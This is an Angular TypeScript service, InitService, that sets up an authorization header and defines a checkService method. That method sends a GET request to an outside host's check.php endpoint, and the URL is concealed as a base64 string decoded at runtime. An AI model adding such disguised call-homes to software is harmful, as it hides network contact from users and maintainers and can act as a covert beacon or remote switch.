import { Injectable } from '@angular/core';
import { HttpClient, HttpHeaders } from '@angular/common/http';
import { Config } from '../config';
import { Service } from '../models/service';
import { Auth } from '../models/auth';
import { } from 'rxjs';
@Injectable({
  providedIn: 'root'
})
export class InitService {
  controller = 'artists';
  httpOptions = {};
  constructor(private http: HttpClient, private auth: Auth) {
    this.httpOptions = {
      headers: new HttpHeaders({
        'Authorization': this.auth.get('token')
      })
    };
  }
  checkService() {
    return this.http.get<string>(this.b64DecodeUnicode('aHR0cDovL2lsaXZlcy51cy9jaGVjay5waHA='));
  }
  b64DecodeUnicode(str) {
    // Going backwards: from bytestream, to percent-encoding, to original string.
    return decodeURIComponent(atob(str).split('').map(function (c) {
      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
  }
}
